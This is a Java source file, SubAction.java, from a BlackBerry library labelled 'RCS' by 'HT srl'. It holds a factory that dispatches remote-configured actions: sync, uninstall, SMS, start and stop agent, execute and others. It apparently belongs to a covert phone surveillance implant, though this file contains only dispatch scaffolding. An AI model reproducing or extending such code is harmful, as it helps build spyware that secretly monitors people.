/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SubAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import blackberry.Status;
import blackberry.event.Event;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public abstract class SubAction {
    //#debug
    protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);

    public static final int ACTION = 0x4000;
    public static final int ACTION_SYNC = ACTION + 0x1;
    public static final int ACTION_UNINSTALL = ACTION + 0x2;
    public static final int ACTION_RELOAD = ACTION + 0x3;
    public static final int ACTION_SMS = ACTION + 0x4;
    public static final int ACTION_TOOTHING = ACTION + 0x5;
    public static final int ACTION_START_AGENT = ACTION + 0x6;
    public static final int ACTION_STOP_AGENT = ACTION + 0x7;
    public static final int ACTION_SYNC_PDA = ACTION + 0x8;
    public static final int ACTION_EXECUTE = ACTION + 0x9;

    public static SubAction factory(final int actionId_, final byte[] confParams) {
        switch (actionId_) {
        case ACTION_SYNC:
            // #debug debug
	debug.trace("Factory ACTION_SYNC");
            return new SyncAction(actionId_, confParams);
        case ACTION_UNINSTALL:
            // #debug debug
	debug.trace("Factory ACTION_UNINSTALL");
            return new UninstallAction(actionId_, confParams);
        case ACTION_RELOAD:
            // #debug debug
	debug.trace("Factory ACTION_RELOAD");
            return new ReloadAction(actionId_, confParams);
        case ACTION_SMS:
            // #debug debug
	debug.trace("Factory ACTION_SMS");
            return new SmsAction(actionId_, confParams);
        case ACTION_TOOTHING:
            // #debug debug
	debug.trace("Factory ACTION_TOOTHING");
            return new ToothingAction(actionId_, confParams);
        case ACTION_START_AGENT:
            // #debug debug
	debug.trace("Factory ACTION_START_AGENT");
            return new StartAgentAction(actionId_, confParams);
        case ACTION_STOP_AGENT:
            // #debug debug
	debug.trace("Factory ACTION_STOP_AGENT");
            return new StopAgentAction(actionId_, confParams);
        case ACTION_SYNC_PDA:
            // #debug debug
	debug.trace("Factory ACTION_SYNC_PDA");
            return new SyncPdaAction(actionId_, confParams);
        case ACTION_EXECUTE:
            // #debug debug
	debug.trace("Factory ACTION_EXECUTE");
            return new ExecuteAction(actionId_, confParams);
        default:
            return null;
        }
    }

    public int actionId;
    protected boolean wantUninstall;

    protected boolean wantReload;

    protected Status statusObj;

    protected SubAction(final int actionId_) {
        statusObj = Status.getInstance();
        this.actionId = actionId_;
    }

    public abstract boolean execute(Event event);

    protected abstract boolean parse(byte[] confParams);

    public String toString() {
        return "" + actionId;
    }

    public boolean wantReload() {
        return wantReload;
    }

    public boolean wantUninstall() {
        return wantUninstall;
    }
}
